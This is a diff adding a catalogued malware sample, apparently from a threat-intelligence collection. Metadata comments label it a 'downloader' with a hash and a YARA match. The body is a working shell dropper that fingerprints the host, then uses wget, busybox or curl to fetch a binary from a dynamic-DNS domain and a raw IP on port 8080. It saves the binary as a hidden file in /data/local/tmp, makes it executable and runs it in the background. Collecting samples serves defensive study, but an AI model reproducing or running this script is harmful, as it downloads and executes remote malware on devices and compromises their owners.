@@ -1,0 +1,11 @@
+# sha256: badc319183f6fef9d9e6d06827ce9fe2d6ed7539a7cc13c57304066470e72190
+# family: downloader
+# kind: script
+# size_bytes: 801
+# first_seen: 2026-07-16 07:23:09.263561 UTC
+# times_seen: 1
+# yara_matches: Big_Numbers3
+# ------------------------------------------------------------
+
+id; uname -m; cat /proc/cpuinfo 2>/dev/null | head -6
+cd /data/local/tmp 2>/dev/null||cd /tmp;rm -f /data/local/tmp/.d;for h in x9k4p7m2q5r8t3v6.mooo.com 23.95.15.159;do (wget -q --header='X-Correlation-Id: b244d1dcc1bf6cfab1dd7c7a0457cb6cb0d402005be429c9014981575a9d2a54' -O /data/local/tmp/.d http://$h:8080/bin/dlr.x86_64||busybox wget -q --header='X-Correlation-Id: b244d1dcc1bf6cfab1dd7c7a0457cb6cb0d402005be429c9014981575a9d2a54' -O /data/local/tmp/.d http://$h:8080/bin/dlr.x86_64||curl -fsSL -H 'X-Correlation-Id: b244d1dcc1bf6cfab1dd7c7a0457cb6cb0d402005be429c9014981575a9d2a54' -o /data/local/tmp/.d http://$h:8080/bin/dlr.x86_64)2>/dev/null&&test -s /data/local/tmp/.d&&break;done;chmod 777 /data/local/tmp/.d 2>/dev/null;test -s /data/local/tmp/.d&&nohup /data/local/tmp/.d>/dev/null 2>&1&
